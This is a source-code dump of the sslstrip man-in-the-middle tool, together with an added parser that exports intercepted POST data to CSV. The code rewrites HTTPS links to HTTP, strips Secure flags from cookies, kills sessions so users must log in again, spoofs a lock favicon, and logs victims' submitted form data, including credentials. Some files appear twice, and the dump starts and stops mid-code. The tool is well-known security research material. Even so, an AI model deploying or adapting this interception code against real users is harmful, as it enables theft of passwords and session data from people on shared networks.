        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data

########NEW FILE########
__FILENAME__ = StrippingProxy
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from twisted.web.http import HTTPChannel
from ClientRequest import ClientRequest

class StrippingProxy(HTTPChannel):
    '''sslstrip is, at heart, a transparent proxy server that does some unusual things.
    This is the basic proxy server class, where we get callbacks for GET and POST methods.
    We then proxy these out using HTTP or HTTPS depending on what information we have about
    the (connection, client_address) tuple in our cache.      
    '''

    requestFactory = ClientRequest

########NEW FILE########
__FILENAME__ = URLMonitor
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.faviconReplacement = False

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        host        = url[methodIndex:pathIndex]
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443
        
        url = method + host + path

        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))

    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = jstripper
#!/usr/bin/env python
# ----------------------------------------------
# Junaid Loonat (junaid@sensepost.com)
# JStripper - Parser for modified SSLStrip logs
# ----------------------------------------------
# How to import a CSV into a MySQL database:
#	http://www.tech-recipes.com/rx/2345/import_csv_file_directly_into_mysql/
# ----------------------------------------------

import os
import sys
import time
import base64
import urllib
import csv
import re

def usage():
	print 'Usage: jstripper.py file'

def processEntry(entry):
	print 'processEntry %s' % entry
	exportFile.writerow([
		entry['timestamp'],
		entry['src_ip'],
		entry['domain'],
		entry['url'],
		entry['secure'],
		entry['post']
	])

if __name__ == '__main__':
	if len(sys.argv) != 2:
		usage()
		sys.exit()
	logFilePath = sys.argv[1]
	if not os.path.exists(logFilePath):
		print 'Specified log file does not exist: %s' % logFilePath
	elif not os.path.isfile(logFilePath):
		print 'Specified log file does not appear to be a file: %s' % logFilePath
	else:
		exportFilePath = '%s%s' % (logFilePath, '.export')
		print 'Export file will be: %s' % exportFilePath
		if os.path.exists(exportFilePath):
			print 'Removing existing export file: %s' % exportFilePath
			os.remove(exportFilePath)
		exportFile = csv.writer(open(exportFilePath, 'wb'), delimiter=',', quotechar='"', quoting=csv.QUOTE_ALL)
		exportFile.writerow(['timestamp', 'src_ip', 'domain', 'url', 'secure', 'post'])

		logFile = open(logFilePath, 'r')
		isEntry = False
		anEntry = {}
		for aLine in logFile:
			if aLine.startswith('2012-') and aLine.find(' Client:') > -1:
				if isEntry:
					processEntry(anEntry)
					isEntry = False
				
				if aLine.find(' POST Data (') > -1:
					isEntry = True
					anEntry = {}
					anEntry['timestamp'] = aLine[:aLine.find(',')]
					anEntry['secure'] = 0
					anEntry['post'] = ''
					if aLine.find('SECURE POST Data (') > -1:
						anEntry['secure'] = 1
						
					tStart = aLine.find(' POST Data (') + 12
					anEntry['domain'] = aLine[tStart:aLine.find(')', tStart)]
					
					tStart = aLine.find(' Client:') + 8
					anEntry['src_ip'] = aLine[tStart:aLine.find(' ', tStart)]
					
					tStart = aLine.find(' URL(') + 8
					anEntry['url'] = aLine[tStart:aLine.find(')URL', tStart)]
					
			elif isEntry:
				anEntry['post'] = '%s%s' % (anEntry['post'], urllib.unquote_plus(aLine.strip()))
				
		if isEntry:
			processEntry(anEntry)
			
		
		logFile.close()
	
		
		
		
		print 'done'

########NEW FILE########
__FILENAME__ = ClientRequest
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
#        self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath): return scriptPath

        logging.warning("Client:%s Error: Could not find lock.ico" % (self.getClientIP()))
        return "lock.ico"        

    def handleHostResolvedSuccess(self, address):
        logging.debug("Client:%s Resolved host successfully: %s -> %s" % (self.getClientIP(), self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path

        self.dnsCache.cacheResolution(host, address)

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            logging.debug("Client:%s Sending expired cookies..." % (self.getClientIP()))
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                    host, headers, path))
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            logging.debug("Client:%s Sending spoofed favicon response..." % (self.getClientIP()))
            self.sendSpoofedFaviconResponse()
        elif (self.urlMonitor.isSecureLink(client, url)):
            logging.debug("Client:%s Sending request via SSL..." % (self.getClientIP()))
            self.proxyViaSSL(address, self.method, path, postData, headers,
                             self.urlMonitor.getSecurePort(client, url))
        else:
            logging.debug("Client:%s Sending request via HTTP..." % (self.getClientIP()))
            self.proxyViaHTTP(address, self.method, path, postData, headers)

    def handleHostResolvedError(self, error):
        logging.warning("Client:%s Host resolution error: " + str(error) % (self.getClientIP()))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Client:%s Host cached." % (self.getClientIP()))
            return defer.succeed(address)
        else:
            logging.debug("Client:%s Host not cached." % (self.getClientIP()))
            return reactor.resolve(host)

    def process(self):
        logging.debug("Client:%s Resolving host: %s" % (self.getClientIP(), self.getHeader('host')))
        host     = self.getHeader('host')               
        deferred = self.resolveHost(host)

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()

########NEW FILE########
__FILENAME__ = CookieCleaner
# Copyright (c) 2004-2011 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import string

class CookieCleaner:
    '''This class cleans cookies we haven't seen before.  The basic idea is to
    kill sessions, which isn't entirely straight-forward.  Since we want this to
    be generalized, there's no way for us to know exactly what cookie we're trying
    to kill, which also means we don't know what domain or path it has been set for.

    The rule with cookies is that specific overrides general.  So cookies that are
    set for mail.foo.com override cookies with the same name that are set for .foo.com,
    just as cookies that are set for foo.com/mail override cookies with the same name
    that are set for foo.com/

    The best we can do is guess, so we just try to cover our bases by expiring cookies
    in a few different ways.  The most obvious thing to do is look for individual cookies
    and nail the ones we haven't seen coming from the server, but the problem is that cookies are often
    set by Javascript instead of a Set-Cookie header, and if we block those the site
    will think cookies are disabled in the browser.  So we do the expirations and whitlisting
    based on client,server tuples.  The first time a client hits a server, we kill whatever
    cookies we see then.  After that, we just let them through.  Not perfect, but pretty effective.

    '''

    _instance = None

    def getInstance():
        if CookieCleaner._instance == None:
            CookieCleaner._instance = CookieCleaner()

        return CookieCleaner._instance

    getInstance = staticmethod(getInstance)

    def __init__(self):
        self.cleanedCookies = set();
        self.enabled        = False

    def setEnabled(self, enabled):
        self.enabled = enabled

    def isClean(self, method, client, host, headers):
        if method == "POST":             return True
        if not self.enabled:             return True
        if not self.hasCookies(headers): return True
        
        return (client, self.getDomainFor(host)) in self.cleanedCookies

    def getExpireHeaders(self, method, client, host, headers, path):
        domain = self.getDomainFor(host)
        self.cleanedCookies.add((client, domain))

        expireHeaders = []

        for cookie in headers['cookie'].split(";"):
            cookie                 = cookie.split("=")[0].strip()            
            expireHeadersForCookie = self.getExpireCookieStringFor(cookie, host, domain, path)            
            expireHeaders.extend(expireHeadersForCookie)
        
        return expireHeaders

    def hasCookies(self, headers):
        return 'cookie' in headers        

    def getDomainFor(self, host):
        hostParts = host.split(".")
        return "." + hostParts[-2] + "." + hostParts[-1]

    def getExpireCookieStringFor(self, cookie, host, domain, path):
        pathList      = path.split("/")
        expireStrings = list()
        
        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + domain + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + host + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        if len(pathList) > 2:
            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 domain + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 host + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")
        
        return expireStrings

    

########NEW FILE########
__FILENAME__ = DnsCache

class DnsCache:    

    '''
    The DnsCache maintains a cache of DNS lookups, mirroring the browser experience.
    '''

    _instance          = None

    def __init__(self):
        self.cache = {}

    def cacheResolution(self, host, address):
        self.cache[host] = address

    def getCachedAddress(self, host):
        if host in self.cache:
            return self.cache[host]

        return None

    def getInstance():
        if DnsCache._instance == None:
            DnsCache._instance = DnsCache()

        return DnsCache._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = ServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
	print self.client

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Client:%s Sending Request: %s %s"  % (self.client.getClientIP(), self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Client:%s Sending header: %s : %s" % (self.client.getClientIP(), header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
	# junaid change
        logging.warning("Client:" + self.client.getClientIP() + " " + self.getPostPrefix() + " Data (" + self.headers['host'] + ") URL(" + self.uri + ")URL:\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "Client:%s HTTP connection made."  % (self.client.getClientIP()))
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Client:%s Got server response: %s %s %s" % (self.client.getClientIP(), version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Client:%s Got server header: %s:%s" % (self.client.getClientIP(), key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Client:%s Response is image content, not scanning..."  % (self.client.getClientIP()))

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Client:%s Response is compressed..."  % (self.client.getClientIP()))
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Client:%s Decompressing content..."  % (self.client.getClientIP()))
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Client:" + self.client.getClientIP() + " Read from server:\n" + data)

        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Client:" + self.client.getClientIP() + " Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()



########NEW FILE########
__FILENAME__ = ServerConnectionFactory
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
from twisted.internet.protocol import ClientFactory

class ServerConnectionFactory(ClientFactory):

    def __init__(self, command, uri, postData, headers, client):
        self.command      = command
        self.uri          = uri
        self.postData     = postData
        self.headers      = headers
        self.client       = client

    def buildProtocol(self, addr):
        return self.protocol(self.command, self.uri, self.postData, self.headers, self.client)
    
    def clientConnectionFailed(self, connector, reason):
        logging.debug("Client:%s Server connection failed." % (self.client.getClientIP()))

        destination = connector.getDestination()

        if (destination.port != 443):
            logging.debug("Client:%s Retrying via SSL" % (self.client.getClientIP()))
            self.client.proxyViaSSL(self.headers['host'], self.command, self.uri, self.postData, self.headers, 443)
        else:
            self.client.finish()


########NEW FILE########
__FILENAME__ = SSLServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string

from ServerConnection import ServerConnection

class SSLServerConnection(ServerConnection):

    ''' 
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    '''

    cookieExpression   = re.compile(r"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression      = re.compile(r"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression     = re.compile(r"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    linkExpression     = re.compile(r"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression     = re.compile(r"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
	self.client = client
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
            value = SSLServerConnection.cookieExpression.sub("\g<1>", value)

        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        (strippedPath, lastSlash, file) = path.rpartition('/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        absoluteLink = ""
        
        if ((not link.startswith('http')) and (not link.startswith('/'))):                
            absoluteLink = "http://"+self.headers['host']+self.stripFileFromPath(self.uri)+'/'+link

#            logging.debug("Client:%s Found path-relative link in secure transmission: " + link % (self.client.getClientIP()))
#            logging.debug("Client:%s New Absolute path-relative link: " + absoluteLink % (self.clien.getClientIP()))                
        elif not link.startswith('http'):
            absoluteLink = "http://"+self.headers['host']+link

#            logging.debug("Client:%s Found relative link in secure transmission: " + link % (self.client.getClientIP()))
#            logging.debug("Client:%s New Absolute link: " + absoluteLink % (self.client.getClientIP()))                            

        if not absoluteLink == "":                
            absoluteLink = absoluteLink.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink);        

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data

########NEW FILE########
__FILENAME__ = StrippingProxy
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from twisted.web.http import HTTPChannel
from ClientRequest import ClientRequest

class StrippingProxy(HTTPChannel):
    '''sslstrip is, at heart, a transparent proxy server that does some unusual things.
    This is the basic proxy server class, where we get callbacks for GET and POST methods.
    We then proxy these out using HTTP or HTTPS depending on what information we have about
    the (connection, client_address) tuple in our cache.      
    '''

    requestFactory = ClientRequest

########NEW FILE########
__FILENAME__ = URLMonitor
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.faviconReplacement = False

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        host        = url[methodIndex:pathIndex]
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443
        
        url = method + host + path

        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))

    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = sslstrip
#!/usr/bin/env python

"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
 
__author__ = "Moxie Marlinspike"
__email__  = "moxie@thoughtcrime.org"
__license__= """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os

gVersion = "0.9"

def usage():
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
    print "Usage: sslstrip <options>\n"
    print "Options:"
    print "-w <filename>, --write=<filename> Specify file to log to (optional)."
    print "-p , --post                       Log only SSL POSTs. (default)"
    print "-s , --ssl                        Log all SSL traffic to and from server."
    print "-a , --all                        Log all SSL and HTTP traffic to and from server."
    print "-l <port>, --listen=<port>        Port to listen on (default 10000)."
    print "-f , --favicon                    Substitute a lock favicon on secure requests."
    print "-k , --killsessions               Kill sessions in progress."
    print "-h                                Print this help message."
    print ""

def parseOptions(argv):
    logFile      = 'sslstrip.log'
    logLevel     = logging.WARNING
    listenPort   = 10000
    spoofFavicon = False
    killSessions = False
    
    try:                                
        opts, args = getopt.getopt(argv, "hw:l:psafk", 
                                   ["help", "write=", "post", "ssl", "all", "listen=", 
                                    "favicon", "killsessions"])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-p", "--post"):
                logLevel = logging.WARNING
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-a", "--all"):
                logLevel = logging.DEBUG
            elif opt in ("-l", "--listen"):
                listenPort = arg
            elif opt in ("-f", "--favicon"):
                spoofFavicon = True
            elif opt in ("-k", "--killsessions"):
                killSessions = True

        return (logFile, logLevel, listenPort, spoofFavicon, killSessions)
                    
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                         

def main(argv):
    (logFile, logLevel, listenPort, spoofFavicon, killSessions) = parseOptions(argv)
        
    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
